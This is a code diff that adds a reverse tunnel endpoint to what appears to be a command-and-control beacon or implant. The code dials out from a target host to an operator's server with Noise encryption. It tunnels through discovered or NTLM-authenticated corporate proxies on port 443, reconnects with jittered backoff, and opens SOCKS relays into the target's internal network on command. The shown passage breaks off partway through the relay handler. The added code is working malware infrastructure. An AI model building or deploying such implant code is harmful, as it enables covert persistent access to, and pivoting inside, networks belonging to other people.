@@ -10,6 +10,7 @@ Zero external dependencies — stdlib only.
 import base64
 import ctypes
 import ctypes.util
+import errno
 import hashlib
 import hmac
 import io
@@ -2403,6 +2404,1229 @@ class ProxyDiscovery:
             active = " [ACTIVE]" if p == self._active_proxy else ""
             lines.append(f"  [{i+1}] {p['url']} ({p['source']}, auth={p.get('auth','?')}){active}")
         return "\n".join(lines)
+
+
+# ── The tunnel endpoint ──
+#
+# The far end of the tunnel: it connects out, holds one command channel
+# open, and on request opens further connections that each proxy one TCP
+# stream into its own network. `software/c2/tunnel/server.py` is the other
+# half and the authority on the protocol; the shape, briefly:
+#
+#   * one connection to one port, carrying a Noise `NKpsk0` handshake
+#     whose first payload is a `HELLO` -- that connection is the command
+#     channel the server holds;
+#   * an `OPEN_RELAY(port, token)` down it per session the operator opens;
+#   * a **second connection to the same port** whose first payload is a
+#     `RELAY(token)`, which the server splices to the operator's SOCKS
+#     client.
+#
+# One port for both, because the usual way out of a target network is an
+# HTTP `CONNECT` proxy that permits 443 and nothing else: Squid ships
+# `acl SSL_ports port 443` with `http_access deny CONNECT !SSL_ports`, so
+# the dial-back-to-a-fresh-high-port design this derives from could not
+# form a tunnel at all from most hosts. The 32-byte token does the job
+# that port used to, cryptographically rather than by arrival order.
+#
+# **Getting out is tried in order: a configured proxy, then
+# `ProxyDiscovery`, then direct.** The published original did a bare
+# `socket.connect((ip, 443))` and could not cross a proxy at all; that is
+# the gap this closes, and most hosts this runs on have no other way out.
+# When a proxy is used this writes its own `CONNECT <server>:<port>` and
+# then speaks Noise over the tunnelled stream, because what follows is not
+# HTTP and urllib would own the socket. `_NtlmProxyRelay` is a *local*
+# CONNECT proxy that handles NTLM against an upstream, so a build
+# configured for NTLM dials `127.0.0.1:<its port>` and writes an ordinary
+# CONNECT to it.
+#
+# Three sharp edges in the layers below, handled here because this is the
+# caller they defer to:
+#
+#   * **`NoiseSession.decrypt` does not retire the session on an
+#     authentication failure.** Noise §5.1 says a session must be
+#     abandoned after a DECRYPT failure; that class leaves the policy to
+#     its caller, so a `ValueError` out of `decrypt` closes the
+#     connection here.
+#   * **`read_frame` cannot tell an orderly teardown from a malformed
+#     peer.** A clean EOF between frames raises `ValueError` just as a
+#     truncated frame does, and a stall past the socket timeout raises
+#     `socket.timeout`, which is an `OSError`. `_bytes_waiting` moves the
+#     distinction into the socket API -- one `MSG_PEEK`, where `b""` is a
+#     FIN with nothing behind it -- and it is used in the two places the
+#     difference changes what is done: the command loop, where a FIN is an
+#     ordinary reconnect and a bad frame is worth a warning, and the
+#     relay's return direction, for the same reason. Where it changes
+#     nothing -- reading the one SOCKS request a relay is owed -- it is not
+#     used, and the comment there says so.
+#   * **`write_frame`'s single `sendall` does not make concurrent writes
+#     safe**; it loops over partial sends and releases the GIL. The
+#     command channel has two writers, the command loop's PONG and the
+#     keep-alive thread's PING, so every write to it goes through
+#     `_TunnelChannel.send` and its lock -- and the lock covers `encrypt`
+#     too, because the nonce it advances has to be ordered with the frame
+#     it belongs to. A relay needs no lock and has an invariant instead:
+#     exactly one thread writes each of its two sockets, which the bridge
+#     documents.
+#
+# Keep-alive is `MSG_PING` / `MSG_PONG`, and not a zero-valued port, which
+# is the original's published trait -- the frame layer refuses the `00 00`
+# that would be.
+
+# How long the command loop blocks in a read before it looks at the stop
+# flag again. Bounded so that `stop` does not wait out an idle timeout,
+# and so the loop does not depend on a closed socket waking a blocked
+# `recv`, which is not reliable on every platform.
+_CONTROL_POLL = 1.0
+
+# Bounds on the keep-alive tick, as on the server: the floor keeps a test
+# with a 100 ms interval honest, and the ceiling bounds how late a PING
+# can be whatever the configured interval is.
+_KEEPALIVE_TICK_FLOOR = 0.02
+_KEEPALIVE_TICK_CEILING = 1.0
+
+_DEFAULT_KEEPALIVE = 30.0
+_DEFAULT_CONNECT_TIMEOUT = 30.0
+
+# The reconnect backoff, the shape `Beacon._backoff_sleep` already uses:
+# a base delay, 1.5 per consecutive failure, a ceiling, and up to 20%
+# jitter on top. A dropped command channel is an ordinary event -- a
+# server restart, a proxy recycling an idle tunnel -- so the endpoint
+# reconnects rather than exiting, and the module constants are what a test
+# moves to avoid waiting out a real delay.
+_TUNNEL_RETRY_BASE = 5.0
+_TUNNEL_RETRY_CEILING = 300.0
+
+# One read fills at most one frame: the plaintext ceiling of a Noise
+# message, so nothing has to be split twice.
+_TUNNEL_CHUNK = MAX_PAYLOAD_LEN
+
+# How long a thread is waited for at teardown. Both directions of a bridge
+# are unparked by a shutdown rather than left to notice on their own, so
+# this bounds a pathology and not the normal path.
+_TUNNEL_JOIN_TIMEOUT = 5.0
+
+# Guards on a proxy's CONNECT response, the same two `_NtlmProxyRelay`
+# has: a broken or hostile proxy must not be able to make this allocate
+# without bound while parsing a reply.
+_PROXY_MAX_LINE = 8192
+_PROXY_MAX_HEADERS = 100
+
+# Which RFC 1928 reply code each failure to reach a target becomes.
+# Explicit, because an operator's tool prints this code directly and a
+# wrong one sends somebody debugging the wrong layer: `0x05` has them
+# looking at the service, `0x03` at the route. Anything unmapped is
+# `REPLY_GENERAL_FAILURE`, which says only that it did not work.
+_SOCKS_REPLY_FOR_ERRNO = {
+    errno.ECONNREFUSED: REPLY_CONNECTION_REFUSED,
+    # An RST in answer to a SYN is what a refusal is.
+    errno.ECONNRESET: REPLY_CONNECTION_REFUSED,
+    errno.ENETUNREACH: REPLY_NETWORK_UNREACHABLE,
+    errno.ENETDOWN: REPLY_NETWORK_UNREACHABLE,
+    errno.ENETRESET: REPLY_NETWORK_UNREACHABLE,
+    errno.EHOSTUNREACH: REPLY_HOST_UNREACHABLE,
+    errno.EHOSTDOWN: REPLY_HOST_UNREACHABLE,
+    errno.ETIMEDOUT: REPLY_TTL_EXPIRED,
+    # A local policy refusal -- a sandbox, an SELinux rule -- rather than
+    # anything the target did.
+    errno.EACCES: REPLY_NOT_ALLOWED,
+    errno.EPERM: REPLY_NOT_ALLOWED,
+    # No stack for the family the operator asked for, which is the one
+    # failure that is about the address type and not the address.
+    errno.EAFNOSUPPORT: REPLY_ADDRESS_TYPE_NOT_SUPPORTED,
+}
+
+
+def _socks_reply_for_error(exc: BaseException) -> int:
+    """The RFC 1928 reply code for one failure to reach a target.
+
+    `socket.timeout` is checked first because it is an `OSError` whose
+    `errno` is `None`, and `socket.gaierror` before the table because its
+    `errno` is an `EAI_*` code that collides numerically with the `errno`
+    values -- `EAI_NONAME` is 8 on this platform, which the table would
+    otherwise read as `ENOEXEC`. A name that does not resolve has no code
+    of its own in RFC 1928; host unreachable is the closest, and it is
+    what stops an operator blaming the tunnel for a typo.
+    """
+    if isinstance(exc, socket.timeout):
+        return REPLY_TTL_EXPIRED
+    if isinstance(exc, socket.gaierror):
+        return REPLY_HOST_UNREACHABLE
+    return _SOCKS_REPLY_FOR_ERRNO.get(getattr(exc, "errno", None),
+                                      REPLY_GENERAL_FAILURE)
+
+
+def _bound_socks_address(sock: socket.socket) -> Tuple[int, str, int]:
+    """`(atyp, address, port)` for RFC 1928 §6's BND.ADDR and BND.PORT.
+
+    The endpoint's own outgoing socket, because that is what the field
+    means and because an operator diagnosing a route wants to see which
+    interface the connection actually left by, not a canned zero. A
+    scoped IPv6 address -- `fe80::1%en0`, which `inet_pton` will not
+    take -- falls back to the unspecified address: the bound address is
+    informational and a reply that cannot be encoded would cost the
+    session.
+    """
+    try:
+        local = sock.getsockname()
+        atyp = (ATYP_IPV6 if sock.family == socket.AF_INET6 else ATYP_IPV4)
+        address, port = str(local[0]), int(local[1])
+        # Encoded and discarded, purely to find out whether it can be.
+        _encode_socks_address(atyp, address)
+        return atyp, address, port
+    except (OSError, ValueError, IndexError, TypeError):
+        return ATYP_IPV4, "0.0.0.0", 0
+
+
+def _bytes_waiting(sock: socket.socket) -> bool:
+    """True if a byte is waiting; False on an orderly close.
+
+    `read_frame` reports a clean EOF between frames and a peer that
+    vanished mid-frame with the same `ValueError`, so the difference is
+    only in the message text. One `MSG_PEEK` moves it into the socket API
+    instead: `b""` is a FIN with nothing behind it, a `socket.timeout`
+    propagates as a peer that went quiet, and anything else means there
+    are bytes in hand -- so a `ValueError` from the `read_frame` that
+    follows is a malformed frame and cannot be an orderly teardown.
+    """
+    return bool(sock.recv(1, socket.MSG_PEEK))
+
+
+def _shutdown_socket(sock: socket.socket) -> None:
+    """Shut a socket down both ways without closing it.
+
+    Without closing, because another thread may still be inside a `recv`
+    or a `sendall` on this descriptor: the shutdown is what unparks it,
+    and closing the descriptor is left to the one frame that knows every
+    thread using it has finished.
+    """
+    try:
+        sock.shutdown(socket.SHUT_RDWR)
+    except OSError:
+        pass
+
+
+def _shut_socket(sock: socket.socket) -> None:
+    """Drop a socket now, waiting for nothing and raising nothing."""
+    _shutdown_socket(sock)
+    try:
+        sock.close()
+    except OSError:
+        pass
+
+
+def _proxy_read_line(sock: socket.socket) -> str:
+    """One CRLF-terminated line from a proxy, read a byte at a time.
+
+    A byte at a time because what follows the blank line is a Noise frame
+    and must not be read into a buffer this function drops. Bounded at
+    `_PROXY_MAX_LINE`, as `_NtlmProxyRelay` bounds its own reads.
+    """
+    chunks = []
+    while len(chunks) < _PROXY_MAX_LINE:
+        byte = sock.recv(1)
+        if not byte:
+            break
+        if byte == b"\n":
+            break
+        if byte != b"\r":
+            chunks.append(byte)
+    return b"".join(chunks).decode("latin-1")
+
+
+def _proxy_endpoint(url) -> Optional[Tuple[str, int]]:
+    """`(host, port)` of an HTTP proxy URL, or None if it is not one.
+
+    Parsed here rather than handed to urllib because this is also where a
+    `socks5://` scheme and a PAC URL are rejected: neither is something a
+    `CONNECT` can be written to, and a tunnel that tried would spend a
+    whole backoff on a proxy that was never going to answer. Any userinfo
+    is dropped -- credentials in a URL are urllib's mechanism, and
+    `_NtlmProxyRelay` is this one's path for a proxy that authenticates.
+    """
+    text = str(url or "").strip()
+    if not text:
+        return None
+    scheme, separator, rest = text.partition("://")
+    if separator and scheme.lower() not in ("http", "https"):
+        return None
+    if not separator:
+        scheme, rest = "http", text
+    authority = rest.split("/", 1)[0]
+    if "@" in authority:
+        authority = authority.rsplit("@", 1)[1]
+    host, colon, port_text = authority.rpartition(":")
+    if not colon:
+        host, port_text = authority, ("443" if scheme.lower() == "https"
+                                      else "80")
+    # A bracketed IPv6 literal, which is how a URL has to write one.
+    host = host.strip("[]")
+    try:
+        port = int(port_text)
+    except ValueError:
+        return None
+    if not host or not 1 <= port <= 0xFFFF:
+        return None
+    return host, port
+
+
+def _route_name(route) -> str:
+    """How one way out is named in a log line or an error."""
+    return "direct" if route is None else "proxy %s:%d" % route
+
+
+def _tunnel_seconds(value, default: float) -> float:
+    """A positive number of seconds from a config field, or `default`."""
+    try:
+        seconds = float(value)
+    except (TypeError, ValueError):
+        return default
+    return seconds if seconds > 0 else default
+
+
+def _tunnel_key(value, field: str, what: str) -> bytes:
+    """The 32 bytes `value` base64-encodes, or a ValueError naming `field`.
+
+    The messages name the field and the problem and never the value or
+    any part of it, following `decode_key`: one of these fields is a PSK,
+    which under `NKpsk0` is the whole credential, and an error message is
+    the easiest place in a program for a secret to end up. Raised outside
+    the except block so the decoder's own error cannot ride along in the
+    chain.
+    """
+    text = value.strip() if isinstance(value, str) else ""
+    problem = None
+    raw = b""
+    if not text:
+        problem = ("%s is required: it is %s, %d bytes base64-encoded"
+                   % (field, what, _NOISE_KEY_LEN))
+    else:
+        try:
+            # binascii.Error is a ValueError.
+            raw = base64.b64decode(text, validate=True)
+        except ValueError:
+            problem = ("%s is not valid base64: it is %s, %d bytes "
+                       "base64-encoded" % (field, what, _NOISE_KEY_LEN))
+        else:
+            if len(raw) != _NOISE_KEY_LEN:
+                problem = ("%s decodes to %d bytes: it is %s, and that is "
+                           "exactly %d bytes"
+                           % (field, len(raw), what, _NOISE_KEY_LEN))
+    if problem:
+        raise ValueError(problem)
+    return raw
+
+
+def tunnel_config_problem(config) -> Optional[str]:
+    """Why this config cannot run a tunnel endpoint, or None.
+
+    The shape of `beacon_key_problem`: a string naming what is wrong, or
+    None. Asked where the config is loaded, so a build whose tunnel block
+    is half-filled stops with a reason instead of retrying a connection it
+    can never make.
+
+    A tunnel that is absent or disabled is not a problem. Most builds have
+    no tunnel, and demanding a PSK of those would break them.
+    """
+    c2 = config.get("c2") if isinstance(config, dict) else None
+    tunnel = c2.get("tunnel") if isinstance(c2, dict) else None
+    if not isinstance(tunnel, dict) or not tunnel.get("enabled"):
+        return None
+    server = tunnel.get("server")
+    if not isinstance(server, str) or not server.strip():
+        return ("c2.tunnel.server is required: it is the host the endpoint "
+                "dials out to, written as the target's network can reach it")
+    identity = tunnel.get("identity")
+    if not isinstance(identity, str) or not identity.strip():
+        return ("c2.tunnel.identity is required: it is the build this PSK "
+                "belongs to, and the server refuses a HELLO that claims "
+                "another one")
+    port = tunnel.get("port")
+    if (isinstance(port, bool) or not isinstance(port, int)
+            or not 1 <= port <= 0xFFFF):
+        return ("c2.tunnel.port must be a port between 1 and 65535: it is "
+                "the single port that serves the command channel and every "
+                "relay, so that one CONNECT rule is enough to cross a proxy")
+    try:
+        _tunnel_key(tunnel.get("public_key"), "c2.tunnel.public_key",
+                    "the tunnel server's static X25519 public key")
+        _tunnel_key(tunnel.get("psk"), "c2.tunnel.psk",
+                    "this build's pre-shared key")
+    except ValueError as exc:
+        return str(exc)
+    return None
+
+
+class _TunnelChannel(object):
+    """The endpoint's command channel: its socket, Noise session and lock.
+
+    Writes take the lock, and the lock covers `encrypt` as well as the
+    bytes. Two threads write here -- the command loop answering a PING
+    with a PONG, and the keep-alive thread sending one of its own -- and
+    `write_frame`'s single `sendall` does not serialise them: it loops
+    over partial sends and releases the GIL. The nonce `encrypt` advances
+    has to be ordered with the frame it produced, so both are inside.
+    """
+
+    def __init__(self, sock: socket.socket, noise: NoiseSession):
+        self.sock = sock
+        self.noise = noise
+        self.last_seen = time.monotonic()
+        self.last_ping = self.last_seen
+        self._write_lock = threading.Lock()
+        # A lock of its own for the closed flag, held across nothing. The
+        # write lock cannot serve: `send` holds that one across a blocking
+        # `sendall`, and `close` has to be able to run then.
+        self._state_lock = threading.Lock()
+        self._closed = False
+
+    def send(self, kind: int, body: dict) -> None:
+        """One command message, under the lock that orders the nonce too."""
+        with self._write_lock:
+            if self._closed:
+                raise OSError("this command channel is closed")
+            write_frame(self.sock,
+                        self.noise.encrypt(encode_message(kind, body)))
+
+    def touch(self) -> None:
+        self.last_seen = time.monotonic()
+
+    @property
+    def closed(self) -> bool:
+        return self._closed
+
+    def close(self) -> None:
+        """Shut the channel down. Never waits on a write in flight."""
+        with self._state_lock:
+            if self._closed:
+                return
+            self._closed = True
+        _shut_socket(self.sock)
+
+
+class TunnelEndpoint(object):
+    """The far end of the tunnel: one command channel, one relay per request.
+
+    `config` is a beacon config and the block read is `c2.tunnel`, which
+    carries `server`, `port`, `public_key`, `psk`, `identity` and
+    optionally `keepalive_seconds`, `connect_timeout_seconds`,
+    `implant_id` and `allow_slow_crypto`. A config this class cannot run
+    is a `ValueError` naming the field, from `tunnel_config_problem`.
+    `c2.proxy` is read too, and it is the same block the beacon's own
+    transports use: one host has one way out.
+
+    `run()` blocks until `stop()`, reconnecting on the beacon's backoff;
+    `status()` is a row for an operator panel.
+    """
+
+    def __init__(self, config: dict):
+        problem = tunnel_config_problem(config)
+        if problem:
+            raise ValueError(problem)
+        c2 = config.get("c2") if isinstance(config, dict) else None
+        tunnel = c2.get("tunnel") if isinstance(c2, dict) else None
+        if not isinstance(tunnel, dict) or not tunnel.get("enabled"):
+            raise ValueError(
+                "c2.tunnel.enabled is not set: this config asks for no "
+                "tunnel, and an endpoint with nothing to dial is not one")
+        self.server = tunnel["server"].strip()
+        self.port = int(tunnel["port"])
+        self.identity = tunnel["identity"].strip()
+        self._public = _tunnel_key(tunnel.get("public_key"),
+                                   "c2.tunnel.public_key",
+                                   "the tunnel server's static X25519 "
+                                   "public key")
+        self._psk = _tunnel_key(tunnel.get("psk"), "c2.tunnel.psk",
+                                "this build's pre-shared key")
+        implant_id = tunnel.get("implant_id")
+        self.implant_id = (implant_id.strip()
+                           if isinstance(implant_id, str) else "")
+        self.keepalive_interval = _tunnel_seconds(
+            tunnel.get("keepalive_seconds"), _DEFAULT_KEEPALIVE)
+        # Three keep-alives missed before the server is declared gone,
+        # which is the rule the server applies to this end: one lost PING
+        # on a bad link should not cost a tunnel.
+        self.idle_timeout = 3 * self.keepalive_interval
+        self.connect_timeout = _tunnel_seconds(
+            tunnel.get("connect_timeout_seconds"), _DEFAULT_CONNECT_TIMEOUT)
+        self.allow_slow_crypto = bool(tunnel.get("allow_slow_crypto"))
+
+        proxy = c2.get("proxy")
+        proxy = proxy if isinstance(proxy, dict) else {}
+        self.proxy_mode = str(proxy.get("mode") or "auto")
+        self.proxy_url = str(proxy.get("url") or "")
+        ntlm = proxy.get("ntlm")
+        self._proxy_ntlm = ntlm if isinstance(ntlm, dict) else {}
+
+        self._lock = threading.Lock()
+        self._stop = threading.Event()
+        self._stop.set()
+        self._channel = None        # type: Optional[_TunnelChannel]
+        self._connected = False
+        self._failures = 0
+        # The way out that worked, so a relay does not re-walk the list.
+        # `None` is a valid route -- direct -- so "not known yet" needs a
+        # flag of its own rather than a sentinel value.
+        self._route = None
+        self._route_known = False
+        self._discovered = None     # type: Optional[list]
+        self._ntlm_relay = None     # type: Optional[_NtlmProxyRelay]
+        # Every socket a relay holds, so `stop` can unpark a pump instead
+        # of waiting for one to notice.
+        self._relay_sockets = set()
+        self._relay_threads = []    # type: list
+        self._sessions = 0
+        self._carried = 0
+
+    # ── lifecycle ──
+
+    def run(self) -> None:
+        """Hold a command channel open, reconnecting until `stop`. Blocks.
+
+        Refuses to start on the pure-Python cipher unless told otherwise.
+        Pure-Python AES-GCM moves roughly 50-200 KB/s, which is fine for
+        the small messages the rest of this file sends and useless for a
+        tunnel -- and "it is slow" would otherwise be diagnosed for hours
+        as a network fault, because every other sign is of a working
+        tunnel. The override exists because a tunnel at 100 KB/s still
+        beats no tunnel when that is the decision an operator wants to
+        make.
+        """
+        if _USE_PURE_PYTHON_AES and not self.allow_slow_crypto:
+            raise RuntimeError(
+                "this host has no libcrypto, so AES-256-GCM runs in pure "
+                "Python at roughly 50-200 KB/s. That is enough for the "
+                "beacon's own messages and not for a tunnel: every session "
+                "would look like a slow network for as long as anybody "
+                "cared to look. Install OpenSSL, or set "
+                "c2.tunnel.allow_slow_crypto to run on the slow path "
+                "deliberately.")
+        self._stop.clear()
+        logger.info("tunnel: endpoint %r dialling %s:%d, crypto %s",
+                    self.identity, self.server, self.port,
+                    self._crypto_path())
+        while not self._stop.is_set():
+            try:
+                self._control_session()
+            except (OSError, ValueError) as exc:
+                # Everything a dead server, a proxy that stopped answering
+                # or a refused handshake can cause arrives here, and the
+                # answer to all of it is the same: wait, and dial again.
+                logger.info("tunnel: the command channel to %s:%d did not "
+                            "last: %s", self.server, self.port, exc)
+            except Exception:
+                # This loop is the whole endpoint: an exception that got
+                # out would be a tunnel that silently stopped existing.
+                logger.exception("tunnel: unexpected error on the command "
+                                 "channel")
+            self._failures += 1
+            if self._stop.is_set():
+                break
+            self._retry_sleep()
+        logger.info("tunnel: endpoint %r stopped", self.identity)
+
+    def stop(self) -> None:
+        """Stop reconnecting and drop everything. Safe before `run`, twice.
+
+        Every socket is shut down rather than only closed: a pump parked
+        in a read, or in a send that TCP backpressure has stopped, does
+        not wake on a bare close on every platform, and this must not wait
+        for one to notice on its own.
+        """
+        self._stop.set()
+        with self._lock:
+            channel = self._channel
+            sockets = list(self._relay_sockets)
+            threads = list(self._relay_threads)
+            relay, self._ntlm_relay = self._ntlm_relay, None
+            self._relay_sockets = set()
+            self._relay_threads = []
+        if channel is not None:
+            channel.close()
+        for sock in sockets:
+            # Shut down and not closed: the relay thread that owns each of
+            # these is the one that closes it.
+            _shutdown_socket(sock)
+        for thread in threads:
+            thread.join(timeout=_TUNNEL_JOIN_TIMEOUT)
+        if relay is not None:
+            relay.stop()
+
+    def status(self) -> dict:
+        """One row's worth of what this endpoint is doing.
+
+        `crypto` is read through the module rather than copied at
+        construction, because it is what an operator checks when a tunnel
+        is inexplicably slow and it has to be the truth now. `egress` is
+        `None` until something has connected, because until then which way
+        out works is not known rather than direct.
+
+        `sessions` is what is open now and `carried` is everything since
+        this endpoint started: the first drops back to zero when a relay
+        closes, and a row that reported only that would tell an operator
+        nothing had ever gone through an endpoint that had just carried a
+        scan.
+        """
+        egress = self._egress()
+        with self._lock:
+            connected = self._connected
+            sessions = self._sessions
+            carried = self._carried
+        return {
+            "identity": self.identity,
+            "server": self.server,
+            "port": self.port,
+            "connected": connected,
+            "sessions": sessions,
+            "carried": carried,
+            "egress": egress,
+            "crypto": self._crypto_path(),
+            "slow_crypto_allowed": self.allow_slow_crypto,
+        }
+
+    # ── the command channel ──
+
+    def _control_session(self) -> None:
+        """One command channel, from the handshake to its last frame."""
+        sock = self._dial(self.port)
+        channel = None
+        keeper = None
+        try:
+            noise = self._handshake(
+                sock, encode_message(MSG_HELLO, self._hello()))
+            channel = _TunnelChannel(sock, noise)
+            with self._lock:
+                self._channel = channel
+                self._connected = True
+                # Reset here and not on the dial: a connection that
+                # authenticated is what proves the way out works, and a
+                # TCP connect that is accepted and then refused would
+                # otherwise reset the backoff on every attempt.
+                self._failures = 0
+            logger.info("tunnel: endpoint %r registered with %s:%d over %s",
+                        self.identity, self.server, self.port, self._egress())
+            keeper = threading.Thread(target=self._keepalive_loop,
+                                      args=(channel,), name="tunnel-keepalive",
+                                      daemon=True)
+            try:
+                keeper.start()
+            except RuntimeError as exc:
+                # The process has no more threads to give. Not fatal: the
+                # server pings this end too and a PONG is answered from
+                # the loop below, so the channel survives without a
+                # keep-alive of its own -- it just takes the server's
+                # idle timeout rather than ours to notice a dead link.
+                keeper = None
+                logger.warning("tunnel: no thread for the keep-alive (%s); "
+                               "relying on the server's", exc)
+            self._control_loop(channel)
+        finally:
+            with self._lock:
+                self._connected = False
+                self._channel = None
+            if channel is not None:
+                channel.close()
+            else:
+                _shut_socket(sock)
+            if keeper is not None:
+                keeper.join(timeout=_TUNNEL_JOIN_TIMEOUT)
+
+    def _hello(self) -> dict:
+        """The HELLO body: which build this is, and what host it is on.
+
+        `identity` is asserted as well as proved, because the server
+        refuses a connection whose HELLO disagrees with the PSK that
+        authenticated it: a build free to claim another's identity would
+        be a SOCKS port pointing at a different network than the operator
+        believes. `implant_id` is sent only when the config carries one --
+        an endpoint started from systemd has no beacon above it, and the
+        server reports that as unlinked rather than hiding the row.
+        """
+        body = {"identity": self.identity,
+                "hostname": platform.node(),
+                "os": "%s %s" % (platform.system(), platform.release())}
+        if self.implant_id:
+            body["implant_id"] = self.implant_id
+        return body
+
+    def _control_loop(self, channel: _TunnelChannel) -> None:
+        """Read and act on command messages until the channel ends."""
+        sock = channel.sock
+        # A poll, not the idle timeout: the deadline is measured against
+        # `last_seen` below so that `stop` does not have to wait one out.
+        poll = min(_CONTROL_POLL, self.keepalive_interval)
+        sock.settimeout(poll)
+        while not self._stop.is_set():
+            try:
+                waiting = _bytes_waiting(sock)
+            except socket.timeout:
+                if time.monotonic() - channel.last_seen < self.idle_timeout:
+                    continue
+                # Not an error and not a malformed peer: nothing has
+                # arrived for three keep-alives, so the server is gone.
+                logger.info("tunnel: %s:%d went quiet for %.1fs; dialling "
+                            "again", self.server, self.port, self.idle_timeout)
+                return
+            except OSError as exc:
+                logger.debug("tunnel: the command channel ended: %s", exc)
+                return
+            if not waiting:
+                # A FIN between frames: an orderly teardown, and the only
+                # way to tell it from a truncated frame, which `read_frame`
+                # reports with the same exception type.
+                logger.info("tunnel: %s:%d closed the command channel",
+                            self.server, self.port)
+                return
+            try:
+                frame = read_frame(sock)
+            except socket.timeout:
+                # Bytes arrived and then stopped mid-frame. Bounded by the
+                # poll above, and dropped rather than waited on.
+                logger.debug("tunnel: %s:%d stalled mid-frame",
+                             self.server, self.port)
+                return
+            except OSError as exc:
+                logger.debug("tunnel: the command channel ended: %s", exc)
+                return
+            except ValueError as exc:
+                # Reached only with bytes in hand, so this is a frame that
+                # was wrong rather than a peer that left.
+                logger.warning("tunnel: a malformed frame from %s:%d: %s",
+                               self.server, self.port, exc)
+                return
+            try:
+                payload = channel.noise.decrypt(frame)
+            except ValueError as exc:
+                # Noise §5.1: abandon the session after a decrypt failure.
+                # `NoiseSession` leaves that policy to its caller, which is
+                # here, so the connection goes.
+                logger.warning("tunnel: a frame from %s:%d did not "
+                               "authenticate (%s); dropping the channel",
+                               self.server, self.port, exc)
+                return
+            try:
+                kind, body = decode_message(payload)
+            except ValueError as exc:
+                logger.warning("tunnel: an undecodable message from %s:%d: "
+                               "%s", self.server, self.port, exc)
+                return
+            channel.touch()
+            if kind == MSG_OPEN_RELAY:
+                self._spawn_relay(body)
+            elif kind == MSG_PING:
+                try:
+                    channel.send(MSG_PONG, {})
+                except (OSError, ValueError) as exc:
+                    logger.debug("tunnel: could not answer a PING: %s", exc)
+                    return
+            elif kind == MSG_PONG:
+                continue
+            elif kind == MSG_CLOSE:
+                logger.info("tunnel: %s:%d asked to close the command "
+                            "channel", self.server, self.port)
+                return
+            else:
+                # HELLO and RELAY both mean the far end has lost track of
+                # which direction it is talking in.
+                logger.warning("tunnel: %s:%d sent %s on an established "
+                               "channel", self.server, self.port,
+                               MESSAGE_KIND_NAMES.get(kind, kind))
+                return
+
+    def _keepalive_loop(self, channel: _TunnelChannel) -> None:
+        """Send a PING when nothing has arrived for a keep-alive interval.
+
+        The server pings too, and either side's PING is answered with a
+        PONG by the other, so one interval of silence in either direction
+        is enough to find a connection that has died without a FIN -- a
+        proxy that recycled an idle tunnel, a NAT that dropped the
+        mapping. A thread of its own rather than the command loop's poll,
+        so a slow frame cannot delay the clock, and it is why
+        `_TunnelChannel.send` holds a lock.
+        """
+        tick = max(_KEEPALIVE_TICK_FLOOR,
+                   min(_KEEPALIVE_TICK_CEILING, self.keepalive_interval / 2.0))
+        try:
+            while not self._stop.wait(tick):
+                if channel.closed:
+                    return
+                now = time.monotonic()
+                if (now - channel.last_seen < self.keepalive_interval
+                        or now - channel.last_ping < self.keepalive_interval):
+                    continue
+                channel.last_ping = now
+                try:
+                    channel.send(MSG_PING, {})
+                except (OSError, ValueError) as exc:
+                    # The command loop owns the reconnect; closing the
+                    # socket is what tells it to let go.
+                    logger.debug("tunnel: keep-alive failed: %s", exc)
+                    channel.close()
+                    return
+        except Exception:
+            logger.exception("tunnel: unexpected error in the keep-alive")
+            channel.close()
+
+    def _retry_sleep(self) -> None:
+        """Wait before dialling again, on the beacon's own backoff shape.
+
+        `_stop.wait` rather than `time.sleep`, so a `stop` does not have
+        to sit out a delay that reaches five minutes.
+        """
+        delay = min(_TUNNEL_RETRY_BASE * (1.5 ** self._failures),
+                    _TUNNEL_RETRY_CEILING)
+        delay += random.uniform(0, delay * 0.2)
+        logger.debug("tunnel: next attempt in %.1fs (failures=%d)",
+                     delay, self._failures)
+        self._stop.wait(delay)
+
+    # ── relays ──
+
+    def _spawn_relay(self, body: dict) -> None:
+        """Dial the relay the server has just asked for, on its own thread."""
+        token = body.get("token")
+        port = body.get("port")
+        if not isinstance(token, str) or not token:
+            logger.warning("tunnel: an OPEN_RELAY carrying no token; ignored")
+            return
+        if (isinstance(port, bool) or not isinstance(port, int)
+                or not 1 <= port <= 0xFFFF):
+            # Including zero, which on the protocol this derives from was
+            # a keep-alive rather than a destination. This one keeps its
+            # keep-alive in PING/PONG and has no use for a port that is
+            # not one.
+            logger.warning("tunnel: an OPEN_RELAY naming %r, which is not a "
+                           "port; ignored", port)
+            return
+        thread = threading.Thread(target=self._relay, args=(port, token),
+                                  name="tunnel-relay", daemon=True)
+        with self._lock:
+            self._relay_threads = [t for t in self._relay_threads
+                                   if t.is_alive()]
+            self._relay_threads.append(thread)
+        try:
+            thread.start()
+        except RuntimeError as exc:
+            # The process has no more threads to give. The operator's end
+            # is told by the session never pairing, which is what it is
+            # already waiting on.
+            with self._lock:
+                if thread in self._relay_threads:
+                    self._relay_threads.remove(thread)
+            logger.warning("tunnel: no thread could be started for a relay: "
+                           "%s", exc)
+
+    def _relay(self, port: int, token: str) -> None:
+        """One relay: dial the same port, claim it with the token, serve it."""
+        sock = None
+        try:
+            sock = self._dial(port)
+            self._register_socket(sock)
+            noise = self._handshake(
+                sock, encode_message(MSG_RELAY, {"token": token}))
+            self._serve_relay(sock, noise)
+        except (OSError, ValueError) as exc:
+            # A relay that could not be dialled, a token the server no
+            # longer holds, a frame that did not authenticate, a session
+            # the operator closed: all of it costs this one relay, and the
+            # operator's end learns of it from the session never pairing
+            # or from the stream ending.
+            logger.info("tunnel: a relay to %s:%d ended: %s",
+                        self.server, port, exc)
+        except Exception:
+            logger.exception("tunnel: unexpected error on a relay")
+        finally:
+            if sock is not None:
+                self._forget_socket(sock)
+                _shut_socket(sock)
+
+    def _serve_relay(self, sock: socket.socket, noise: NoiseSession) -> None:
+        """Read the one SOCKS request this relay carries, and answer it.
+
+        No `_bytes_waiting` peek here, unlike the command loop: at this
+        point in the protocol the operator's end owes exactly one request,
+        so an orderly FIN and a truncated frame mean the same thing -- the
+        session is over before it began -- and both end this relay. The
+        distinction is only worth making where it changes what is done.
+        """
+        sock.settimeout(self.connect_timeout)
+        # A ValueError from either call is a frame that did not
+        # authenticate or a request that was not one; the caller closes
+        # the connection over it, which is Noise §5.1 where the policy
+        # was deferred to.
+        cmd, atyp, address, port = decode_socks_request(
+            noise.decrypt(read_frame(sock)))
+        # The request's own address type is not acted on: the codec is the
+        # authority on it and refuses one it does not know, and the type
+        # in the reply is the family of the socket actually opened, which
+        # is not always the family that was asked for -- a name can
+        # resolve to either.
+        target = "%s:%d" % (address, port)
